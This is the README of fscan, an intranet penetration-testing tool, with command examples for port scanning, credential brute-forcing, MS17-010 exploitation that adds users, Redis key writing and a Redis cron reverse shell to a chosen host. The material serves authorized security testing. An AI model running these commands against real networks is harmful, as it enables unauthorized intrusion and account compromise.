# fscan

# 1. Introduction
A comprehensive intranet scanning tool, which is convenient for one-click automation and all-round missed scanning.
Support host survival detection, port scanning, blasting of common services, ms17010, redis batch write public key, scheduled task rebound shell, read win network card information, web fingerprint identification, web vulnerability scanning, netbios detection, domain control identification and other functions.

# 2. The main function
1. Information collection:
* liveness detection(icmp)
* port scan

2.Blasting function:
* All kinds of service blasting(ssh, smb, rdp, etc.)
* Database password blasting(mysql、mssql、redis、psql、oracle, etc.)  

3.System Information, Vulnerability Scan:  
* netbios detection, domain controller identification
* Get target network card information
* High Risk Vulnerability Scanning(ms17010, etc.)  

4.Web detection function:
* webtitle detection
* Web fingerprinting (common cms, oa framework, etc.)
* Web vulnerability scanning (weblogic, st2, etc., poc that supports xray)

5.Exploit:
* redis write public key or write scheduled task  
* ssh command execution  
* ms17017 use (insert shellcode), such as adding users, etc.

6.Other functions:
* file save

# 3. Instructions for use
Simple usage
``` 
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/16  (B段扫描)
```

其他用法
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt  (以文件导入)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
```
Compile command
```
go build -ldflags="-s -w " -trimpath main.go
upx -9 fscan.exe (可选,压缩体积)
```

Full parameters
```
-c string
        ssh command execution
  -cookie string
        set cookies
  -debug int
        How long has no response, print the current progress (default 60)
  -domain string
        When smb blasts the module, set the domain name
  -h string
        target ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        read target from file
  -hn string
        When scanning, ip to skip: -hn 192.168.1.1/24
  -m string
        Set scan mode: -m ssh (default "all")
  -no
        Scan results are not saved to file
  -nobr
        Skip password blasting for sql, ftp, ssh, etc.
  -nopoc
        skip web poc scan
  -np
        skip liveness detection
  -num int
        web poc packet sending rate (default 20)
  -o string
        Where to save scan results (default "result.txt")
  -p string
        Set the port to scan: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017 ")
  -pa string
        Add the port to be scanned, -pa 3389 (the port will be added based on the original port list)
  -path string
        fcgi, smb romote file path
  -ping
        Use ping instead of icmp for liveness detection
  -pn string
        Port to skip when scanning, as: -pn 445
  -pocname string
        Specify the ambiguous name of the web poc, -pocname weblogic
  -proxy string
        Set proxy, -proxy http://127.0.0.1:8080
  -user string
        Specify the username when blasting
  -userf string
        Specify the username file when blasting
  -pwd string
        Specify the password when blasting
  -pwdf string
        Specify the password file when blasting
  -rf string
        The file specifying the module for redis to write the public key (as: -rf id_rsa.pub)
  -rs string
        The ip port of the redis scheduled task bounce shell (as: -rs 192.168.1.1:6666)
  -silent
        Silent scan, suitable for cs scan without echo
  -sshkey string
        When connecting with ssh, specify the ssh private key
  -t int
        scan thread (default 600)
  -time int
        Port scan timeout (default 3)
  -u string
        Specify Url to scan
  -uf string
        Specify Url file scan
  -wt int
        web access timeout (default 5)
  -pocpath string
        Specify the poc path
  -usera string
        On the basis of the original user dictionary, add new users
  -pwda string
        On the basis of the original password dictionary, add a new password
  -socks5
        Specify socks5 proxy (as: -socks5 socks5://127.0.0.1:1080)
  -sc
        Specify ms17010 to use module shellcode, built-in functions such as adding users (as: -sc add)
```

# 4. Run screenshot

`fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc`
![](image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)`
![](image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)`
![](image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)`
![img.png](image/live.png)

# 5. Disclaimer

This tool is only for **legally authorized** enterprise security construction behavior. If you need to test the usability of this tool, please build a target environment by yourself.

In order to avoid malicious use, all POCs included in this project are theoretical judgments of vulnerabilities, there is no vulnerability exploitation process, and no real attacks or exploits will be launched on the target.

When using this tool for testing, you should ensure that the behavior complies with local laws and regulations and has obtained sufficient authorization. **Do not scan unauthorized targets. **

If you have any illegal behavior in the process of using this tool, you shall bear the corresponding consequences by yourself, and we will not bear any legal and joint responsibility.

Before installing and using this tool, please **must read carefully and fully understand the content of each clause**. Restrictions, disclaimers or other clauses involving your significant rights and interests may be bolded or underlined to remind you to pay attention .
Unless you have fully read, fully understood and accepted all the terms of this agreement, please do not install and use this tool. Your use behavior or your acceptance of this Agreement in any other express or implied manner shall be deemed that you have read and agreed to be bound by this Agreement.


# 6. 404StarLink 2.0 - Galaxy
![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

fscan 是 404Team [星链计划2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) 中的一环，如果对fscan 有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)


# 7. Star Chart
[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)

# 8. donate
If you find this project helpful, you can invite the author for a drink🍹 [点我](image/sponsor.png)

# 9. Reference link
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc


# 10. latest update
[+] 2022/7/14 -hf 支持host:port和host/xx:port格式,rule.Search 正则匹配范围从body改成header+body,-nobr不再包含-nopoc.优化webtitle 输出格式  
[+] 2022/7/6 加入手工gc回收,尝试节省无用内存。 -url 支持逗号隔开。 修复一个poc模块bug。-nobr不再包含-nopoc。  
[+] 2022/7/2 加强poc fuzz模块,支持跑备份文件、目录、shiro-key(默认跑10key,可用-full参数跑100key)等。新增ms17017利用(使用参数: -sc add),可在ms17010-exp.go自定义shellcode,内置添加用户等功能。  
新增poc、指纹。支持socks5代理。因body指纹更全,默认不再跑ico图标。    
[+] 2022/4/20 poc模块加入指定目录或文件 -pocpath poc路径,端口可以指定文件-portf port.txt,rdp模块加入多线程爆破demo, -br xx指定线程  
[+] 2022/2/25 新增-m webonly,跳过端口扫描,直接访问http。致谢@AgeloVito  
[+] 2022/1/11 新增oracle密码爆破  
[+] 2022/1/7  扫ip/8时,默认会扫每个C段的网关和数个随机IP,推荐参数:-h ip/8 -m icmp.新增LiveTop功能,检测存活时,默认会输出top10的B、C段ip存活数量.  
[+] 2021/12/7 新增rdp扫描,新增添加端口参数-pa 3389(会在原有端口列表基础上,新增该端口)  
[+] 2021/12/1 优化xray解析模块,支持groups、新增poc,加入https判断(tls握手包),优化ip解析模块(支持所有ip/xx),增加爆破关闭参数 -nobr,添加跳过某些ip扫描功能 -hn 192.168.1.1,添加跳过某些端口扫描功能-pn 21,445,增加扫描docker未授权漏洞  
[+] 2021/6/18 改善一下poc的机制，如果识别出指纹会根据指纹信息发送poc，如果没有识别到指纹才会把所有poc打一遍  
[+] 2021/5/29 加入fcgi协议未授权命令执行扫描,优化poc模块,优化icmp模块,ssh模块加入私钥连接  
[+] 2021/5/15 新增win03版本(删减了xray_poc模块),增加-silent 静默扫描模式,添加web指纹,修复netbios模块数组越界,添加一个CheckErrs字典,webtitle 增加gzip解码  
[+] 2021/5/6 更新mod库、poc、指纹。修改线程处理机制、netbios探测、域控识别模块、webtitle编码模块等  
[+] 2021/4/22 修改webtitle模块,加入gbk解码  
[+] 2021/4/21 加入netbios探测、域控识别  
[+] 2021/3/4 支持-u url或者-uf url.txt,对url进行批量扫描  
[+] 2021/2/25 修改yaml解析模块,支持密码爆破,如tomcat弱口令。yaml中新增sets参数,类型为数组,用于存放密码,具体看tomcat-manager-week.yaml  
[+] 2021/2/8 增加指纹识别功能,可识别常见CMS、框架,如致远OA、通达OA等。  
[+] 2021/2/5 修改icmp发包模式,更适合大规模探测。   
修改报错提示,-debug时,如果10秒内没有新的进展,每隔10秒就会打印一下当前进度    
[+] 2020/12/12 已加入yaml解析引擎,支持xray的Poc,默认使用所有Poc(已对xray的poc进行了筛选),可以使用-pocname weblogic,只使用某种或某个poc。需要go版本1.16以上,只能自行编译最新版go来进行测试    
[+] 2020/12/6 优化icmp模块,新增-domain 参数(用于smb爆破模块,适用于域用户)  
[+] 2020/12/03 优化ip段处理模块、icmp、端口扫描模块。新增支持192.168.1.1-192.168.255.255。  
[+] 2020/11/17 增加-ping 参数,作用是存活探测模块用ping代替icmp发包。   
[+] 2020/11/17 增加WebScan模块,新增shiro简单识别。https访问时,跳过证书认证。将服务模块和web模块的超时分开,增加-wt 参数(WebTimeout)。    
[+] 2020/11/16 对icmp模块进行优化,增加-it 参数(IcmpThreads),默认11000,适合扫B段  
[+] 2020/11/15 支持ip以文件导入,-hf ip.txt,并对去重做了处理
